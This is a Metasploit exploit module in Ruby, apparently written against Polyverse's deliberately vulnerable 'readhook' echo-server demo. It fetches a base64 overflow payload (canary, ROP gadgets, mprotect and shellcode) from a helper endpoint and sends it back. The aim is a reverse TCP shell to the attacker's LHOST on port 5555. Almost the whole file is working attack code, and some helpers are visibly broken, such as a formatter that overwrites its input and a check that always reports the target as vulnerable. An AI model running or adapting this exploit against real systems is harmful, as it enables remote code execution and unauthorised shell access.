class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::HttpClient

    module Target
        Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'           => 'Polyverse readhook-node-echo-server example',
                'Description'    => %q{ Do a send_request_cgi() },
                'Author'         => [ 'Polyverse Corp.' ],
                'License'        => MSF_LICENSE,
                'References'     => [ [ 'URL', 'https://polyverse.io' ], ],
                'Platform'       => [ 'linux' ],
                'Payload'        => { },
                'Arch'           => [ ARCH_X64 ],
                'Targets'        => [ [ 'Linux x64', { 'Arch' => ARCH_X64, } ] ],
                'DefaultTarget'  => Target::Linux,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/shell_reverse_tcp' }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
            OptString.new('FULLHOOK_BASE_URI', [true, 'The base path for FULLHOOK magic.', '/xyzzx']),
            OptString.new('BASEHOOK_BASE_URI', [true, 'The base path for BASEHOOK magic.', '/xyzzy'])
        ], self.class)
    end

    # Define a struct representing an offset.
    Offset = Struct.new(:r, :b, :f) do
    end

    # Define a struct representing an address.
    Address = Struct.new(:r, :b, :f) do
    end

    # Define a struct representing the example payload from FULLHOOK.
    Payload = Struct.new(:pl_dst, :pl_canary, :pl_rbp, :pl_popRDI, :pl_stackPage, :pl_popRSI, :pl_stackSize, :pl_popRDX, :pl_permission, :pl_mprotect, :pl_shellCode) do
    
        # Formatter for binary string to hex string
        def to_s(str)
            #return str.unpack('LCCCC') 
            str = "abcdefgh"
            return [ str[7], str[6], str[2], str[3], str[4], str[5], str[6], str[7] ] #str.unpack('LCCCC') 
        end

        def from_makeload(encoded)
            s = Struct::Payload.new(0, 1, 2, 3, 4, 5, 6, 7, 8, 9)

            print "encoded: ", encoded, encoded.length().to_s(), "\n"
            decoded = Rex::Text.decode_base64(encoded)
            print "decoded: ", decoded, decoded.length().to_s(), "\n"

            for i in 1..s.length
                s[i - 1] = decoded[(i - 1) * 8, 8];
            end

            return s
        end

        def print_pair(name, value)
		puts("#{name}".ljust(13) + " => " + "#{to_s(value)}".ljust(16))
        end

        def print_table()
            each_pair {|name, value| print_pair(name, value) }
        end
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    def exploit
        #print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
            return
        end

	# payload = Payload.new(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)

	# Ask FULLHOOK for a payload that will give us a reverse shell from the remote host
        uri = datastore['FULLHOOK_BASE_URI'] + "MAKELOAD" + datastore['LHOST'] + ':' + datastore['LPORT'].to_s(10)
        res = send_request_cgi( { 'method' => 'GET', 'uri' => uri } )

        if res && res.code == 200
            encoded = res.body[datastore['FULLHOOK_BASE_URI'].length() + "OVERFLOW".length()..-1]
	    payload = Struct::Payload::from_makeload(encoded)
            payload.print_table()

            # Exploit
            res = send_request_cgi( { 'method' => 'GET', 'uri' => res.body } )
        end

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
